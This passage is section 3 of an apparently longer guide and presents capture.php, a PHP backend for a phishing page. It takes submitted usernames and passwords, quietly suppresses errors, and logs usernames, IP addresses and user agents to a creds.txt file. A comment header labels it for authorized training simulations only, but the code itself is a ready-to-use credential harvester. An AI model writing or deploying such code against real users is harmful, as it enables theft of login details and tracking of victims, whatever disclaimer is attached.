### 3. `capture.php` (PHP Backend)

```php
<?php
/*
 * SECURE CREDENTIAL CAPTURE - EDUCATIONAL USE ONLY
 * For authorized internal training simulations only.
 * Unauthorized use is a violation of acceptance policies.
 */

// Start file for debugging optional
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    exit(); // Only process valid POST submissions
}

// Suppress error output during actual capture
ini_set('display_errors', 0);

// Get timestamp
$timestamp = date('Y-m-d H:i:s');

// Get remote IP address
$ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN_IP';

// Get user agent string
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN_UA';

// Sanitize input for logging (XSS protection via htmlspecialchars)
$username = isset($_POST['username']) ? htmlspecialchars(trim($_POST['username']), ENT_QUOTES, 'UTF-8') : 'BLANK';
$password = isset($_POST['password']) ? htmlspecialchars($_POST['password'], ENT_QUOTES, 'UTF-8') : 'BLANK';

// Define log file path (same directory as script)
$logFile = __DIR__ . '/creds.txt';

// Create formatted log entry
$logEntry = "\n========================================\n";
$logEntry .= "CAPTURE RECORD\n";
$logEntry .= "Timestamp: $timestamp\n";
$logEntry .= "Username:  $username\n";
$logEntry .= "IP Address: $ipAddress\n";
$logEntry .= "User-Agent: $userAgent\n";
$logEntry .= "========================================\n";

// Append to log file (create if doesn't exist)
$fileHandle = fopen($logFile, 'a');
if ($fileHandle) {
    fwrite($fileHandle, $logEntry);
    fclose($fileHandle);
} else {
    // Error: unable to create log file (silently fail for training)
}

// Optional: set secure permissions on log file
chmod($logFile, 0640);
?>
